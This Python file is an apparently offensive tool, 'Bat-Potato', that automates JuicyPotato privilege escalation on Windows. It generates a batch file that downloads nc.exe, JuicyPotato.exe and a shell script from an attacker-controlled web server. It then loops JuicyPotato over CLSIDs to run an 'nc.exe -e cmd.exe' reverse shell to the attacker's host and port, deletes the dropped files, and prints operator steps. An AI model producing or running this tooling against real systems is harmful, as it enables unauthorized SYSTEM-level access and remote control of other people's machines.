import os


#CHANGE ME

JUICY_REMOTE_PATH='C:\\Users\\<username>\\AppData\\Local\\Temp'
CLSID_file = "wordlist/w7_enterprise.list"
LHOST="10.10.10.10"
LPORT="443"
JUICY_POTATO_BIN = "JuicyPotato.exe"


#IF DEFAULT, DO NOT CHANGE
LWEBSERVER_PORT="80"
NC_BIN = "nc.exe"
WGET_BIN = "wgetx86.exe"
OUTPUT_BAT_NAME = "Bat-Potato.bat"
SHELL_BAT_NAME = "shell.bat"


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def banner():
        print(bcolors().ENDC)
        print(bcolors().ENDC)
        print("""


        __________         __           __________       __          __          
        \______   \_____ _/  |_         \______   \_____/  |______ _/  |_  ____  
        |    |  _/\__  \\   __\  ______ |     ___/  _ \   __\__  \\   __\/  _ \ 
        |    |   \ / __ \|  |   /_____/ |    |  (  <_> )  |  / __ \|  | (  <_> )
        |______  /(____  /__|           |____|   \____/|__| (____  /__|  \____/ 
                \/      \/                                        \/             

                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                        ⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣷⣾⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                        ⠘⢿⣿⣿⣿⣶⡄⠀⢠⣤⣶⣶⣶⣤⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                        ⠀⠘⡿⣿⣿⣿⢿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                        ⠀⠀⢹⢿⡟⣱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                        ⠀⠀⢸⡿⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                        ⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                        ⠀⠀⢸⣿⣿⣿⣿⡿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                        ⠀⠀⠘⣿⡟⠻⣿⣷⣿⣿⠿⢋⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                        ⠀⠀⠀⢿⣿⣶⡾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                        ⠀⠀⠀⠘⣿⣿⣵⣿⣿⣿⣿⣿⠿⠟⠛⠋⠉⠀⠹⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                        ⠀⠀⠀⠀⠹⡉⠉⠛⢻⢕⠒⡒⠂⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                        ⠀⠀⠀⠀⢠⣷⣄⣁⣄⣀⣠⣀⠀⠀⠀⢂⣠⣴⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀
                        ⠀⠀⠀⢠⣾⡿⢏⣿⣤⣶⣘⡍⠙⠻⣿⣿⣿⣽⣷⣾⣿⣿⣿⣷⣦⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣖⣾⣭⣿⣿⣶⣿⣾⣿⣿⣿⣿⣶⣦⣀⠀⠀
                        ⠀⠀⠀⣾⣿⡇⠐⡀⢸⢻⣻⡿⠦⢀⢹⣿⣿⣿⣿⣽⣭⣽⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣟⠻⣿⣿⣿⣿⣷⡀
                        ⠀⠀⡸⠛⠛⠳⣄⠱⠚⠁⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⢿⣿⣿⣿⠀⠙⢿⣿⣿⠀⠙⣿⣿⠏⢿⣷
                        ⠀⣰⠁⠀⠀⠀⠀⠙⠒⠒⠒⠚⠋⠉⠉⠉⠉⠉⠙⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠉⠻⣿⣿⠀⠀⠈⢿⣿⠀⠀⠀⢻⠏⠀⠀⢹⡟⠀⠸⣿
                        ⠀⢃⠀⠐⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⣿⣿⣿⠛⢿⣿⣿⣿⡇⠈⠛⢿⣿⡿⠀⠀⠘⡿⠀⠀⠀⠸⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋
                        ⠀⠸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣠⢿⣿⠇⠀⠀⠘⢿⡿⠀⠀⠀⠀⠻⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                        ⠀⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                        ⠀⠀⠀⠳⣄⠢⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣡⢖⣻⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                        ⠀⠀⠀⠀⠙⢶⣄⡀⡄⠀⠀⢀⠀⣀⢀⣤⣄⣶⣯⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                        ⠀⠀⠀⠀⠀⠀⠉⠛⠻⠿⢿⣘⣧⣹⣼⠿⠿⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


     """)
        
def create_bat_shell():
        file = open(SHELL_BAT_NAME, "w")
        file.write(f"{JUICY_REMOTE_PATH}\\{NC_BIN} -e cmd.exe {LHOST} {LPORT}")
        file.close()
        print(f"{bcolors.OKGREEN}[+] {SHELL_BAT_NAME} created.{bcolors.OKGREEN}")

def create_bat_potato():
        file = open(OUTPUT_BAT_NAME, "w")
        file.write(f"ECHO Attempting to get {SHELL_BAT_NAME} from server\n")
        file.write(f"{JUICY_REMOTE_PATH}\\{WGET_BIN} http://{LHOST}:{LWEBSERVER_PORT}/{SHELL_BAT_NAME}\n")
        file.write(f"ECHO Attempting to get {NC_BIN} from server\n")
        file.write(f"{JUICY_REMOTE_PATH}\\{WGET_BIN} http://{LHOST}:{LWEBSERVER_PORT}/{NC_BIN}\n")
        file.write(f"ECHO Attempting to get {JUICY_POTATO_BIN} from server\n")
        file.write(f"{JUICY_REMOTE_PATH}\\{WGET_BIN} http://{LHOST}:{LWEBSERVER_PORT}/{JUICY_POTATO_BIN}\n")

        file_clsid = open(CLSID_file, 'r')
        lines = file_clsid.readlines()
        file_clsid.close()

        for line in lines:
                file.write(f"{JUICY_REMOTE_PATH}\\{JUICY_POTATO_BIN} -p {JUICY_REMOTE_PATH}\\{SHELL_BAT_NAME} -l {LPORT} -t * -c " + line)
        
        file.write(f"\ndel {JUICY_REMOTE_PATH}\\{SHELL_BAT_NAME}")
        file.write(f"\ndel {JUICY_REMOTE_PATH}\\{JUICY_POTATO_BIN}")
        file.close()
        
        print(f"{bcolors.OKGREEN}[+] {OUTPUT_BAT_NAME} created.{bcolors.OKGREEN}")

def main():
        print("\n")
        create_bat_potato()
        create_bat_shell()
        banner()
        print(f"\n\n {bcolors.OKGREEN}-------------------------------------\n\n{bcolors.OKGREEN}") 
        print(f"{bcolors.OKBLUE}[+] Python WebServer listening on{bcolors.OKBLUE}:")
        print(f"{bcolors.OKCYAN}==> {bcolors.UNDERLINE}http://{LHOST} {LWEBSERVER_PORT}{bcolors.ENDC}{bcolors.ENDC}\n")
        print(f"{bcolors.FAIL}STEPS:\n")
        print(f"{bcolors.FAIL}[-] Upload {OUTPUT_BAT_NAME} on server ")
        print(f"{bcolors.FAIL}[-] Upload {WGET_BIN} on server ")
        print(f'[-] Open new tab and listen on machine attacker on port {LPORT}')
        print(f"[-] Execute on server: .\\{OUTPUT_BAT_NAME} {bcolors.WARNING}\n")
        os.system(f"/usr/bin/python3 -m http.server {LWEBSERVER_PORT}")

if __name__ == '__main__':
        main()